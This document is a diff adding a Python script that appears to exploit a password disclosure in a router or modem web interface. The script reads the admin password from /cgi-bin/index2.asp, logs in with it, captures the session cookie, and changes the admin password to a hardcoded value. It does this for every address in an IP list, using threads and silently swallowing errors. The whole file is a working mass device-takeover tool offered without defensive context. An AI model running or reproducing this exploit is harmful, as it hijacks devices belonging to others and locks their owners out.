@@ -1,0 +1,116 @@
+import requests
+import re
+import concurrent.futures
+
+def perform_login(ip_port):
+    url = f"http://{ip_port}/cgi-bin/index2.asp"
+    headers = {
+        "Host": ip_port,
+        "Connection": "close",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
+    }
+
+    try:
+        # Retrieve device password
+        response = requests.get(url, headers=headers, timeout=5)  # Set a timeout value (in seconds)
+        response.raise_for_status()  # Raise an error for bad responses (non-2xx status codes)
+        
+        response_body = response.text
+        match = re.search(r"str = '(\d+)'", response_body)
+
+        if match:
+            value_of_str = match.group(1)
+
+            # Send second POST request
+            post_url = f"http://{ip_port}/cgi-bin/index2.asp"
+            post_headers = {
+                "Host": ip_port,
+                "Content-Length": str(len(value_of_str)),
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
+                "Cookie": f"LoginTimes=1; UID=admin; PSW={value_of_str}",
+                "Connection": "close",
+            }
+
+            post_payload = {
+                "Username": "admin",
+                "Logoff": "0",
+                "hLoginTimes": "1",
+                "hLoginTimes_Zero": "0",
+                "value_one": "1",
+                "Password1": value_of_str,
+                "Password2": value_of_str,
+                "logintype": "usr",
+                "LanIP": "192.168.1.1",
+                "Ipv6LanIP": "fe80%3A%3A1",
+                "AccessIP": ip_port.split(":")[0],  # Extracting only the device IP
+                "Password": value_of_str,
+            }
+
+            response_post = requests.post(post_url, headers=post_headers, data=post_payload, timeout=5)
+
+            # Additional GET request after the POST request
+            get_url = f"http://{ip_port}/cgi-bin/content.asp"
+            get_headers = {
+                "Host": ip_port,
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
+                "Sec-Purpose": "prefetch;prerender",
+                "Purpose": "prefetch",
+                "Cookie": f"UID=admin; PSW={value_of_str}",
+                "Connection": "close",
+            }
+
+            response_get = requests.get(get_url, headers=get_headers, timeout=5)
+
+            # Check for the Set-Cookie header in the response
+            if 'Set-Cookie' in response_get.headers:
+                set_cookie_header = response_get.headers['Set-Cookie']
+                session_id_match = re.search(r"SESSIONID=([^;]+)", set_cookie_header)
+
+                if session_id_match:
+                    session_id_value = session_id_match.group(1)
+                    print(f"[*] SESSIONID value for {ip_port}: {session_id_value}")
+
+                    # Write successful login to out.txt
+                    with open('out.txt', 'a') as out_file:
+                        out_file.write(f"{ip_port}\n")
+
+                    # Print response headers for /cgi-bin/content.asp
+                    print("[*] Response Headers of the GET request to /cgi-bin/content.asp:")
+                    for key, value in response_get.headers.items():
+                        print(f"{key}: {value}")
+
+                    # Third POST request
+                    post_url_third = f"http://{ip_port}/cgi-bin/mag-account.asp"
+                    post_headers_third = {
+                        "Host": ip_port,
+                        "Content-Length": "196",
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
+                        "Cookie": f"SESSIONID={session_id_value}; UID=admin; PSW={value_of_str}",
+                        "Connection": "close",
+                    }
+
+                    post_payload_third = {
+                        "name0": "superadmin",
+                        "name1": "admin",
+                        "name2": "user3",
+                        "displayMask": "BF+00+0F+CC+FF+B7+03+00+01",
+                        "oldUsername": "admin",
+                        "newUsername": "",
+                        "oldPassword": value_of_str,
+                        "newPassword": "F20vsN%40tL1b",
+                        "cfmPassword": "F20vsN%40tL1b",
+                        "accountflg": "1",
+                    }
+
+                    response_post_third = requests.post(post_url_third, headers=post_headers_third, data=post_payload_third, timeout=5)
+                    print(f"[*] key changed for <> status: {response_post_third.status_code}")
+
+    except requests.exceptions.RequestException:
+        pass  # Suppress any request-related exceptions
+
+# Read IPs from file and perform login for each using threading
+with open('ips.txt', 'r') as file:
+    ip_ports = [line.strip() for line in file]
+
+with concurrent.futures.ThreadPoolExecutor() as executor:
+    executor.map(perform_login, ip_ports)
